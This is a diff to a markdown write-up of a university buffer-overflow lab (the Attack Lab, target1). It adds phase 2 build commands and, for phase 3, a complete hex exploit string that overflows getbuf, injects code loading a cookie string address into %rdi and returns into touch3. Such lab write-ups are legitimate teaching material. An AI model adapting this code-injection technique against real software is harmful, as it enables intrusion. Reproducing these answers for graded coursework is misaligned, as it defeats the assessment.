@@ -145,6 +145,11 @@
 
 - The exploit code is to move cookie value to register `%rdi` which is shown in [mov_rdi.s](./target1/phase_2/mov_rdi.s) and `ret` instruction
 
+    ```
+    gcc -c mov_rdi.s
+    objdump -d mov_rdi.o > mov_rdi.d
+    ```
+
 - We insert the `touch2` function first instruction address to the stack frame in `test` function
 
 - After the `getbuf` executes `ret` instruction, the code transfers the control to the exploit code, executes `mov` and `ret` instructions, and transfers the control to `touch2`
@@ -163,6 +168,35 @@
     ```
 
 ### Phase 3
+- The stack frame
+
+    ![](./images/phase_3_stack_frame.png)
+
+- The overall structure is similar to phase 2 except that
+    - We store the cookie string at `0x5561dcb8`
+
+    - The exploit code is to move the cooke string address to register `%rdi`
+
+- The cookie string `59b997fa`
+
+    ```
+    35 39 62 39 39 37 66 61 00
+    ```
+
+- The phase 3 exploit string is 
+
+    ```
+    00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00 /* 40 bytes to fill the stack frame of getbuf */
+    b0 dc 61 55 00 00 00 00 /* position of return address of launch function */
+    fa 18 40 00 00 00 00 00 /* touch3 first instruction address */
+    48 c7 c7 b8 dc 61 55 c3 /* movq $0x5561dcb8, %rdi  ret */ 
+    35 39 62 39 39 37 66 61
+    00 00 00 00 00 00 00 00 /* cookie string */
+    ```
 
 ### Phase 4
 ### Phase 5
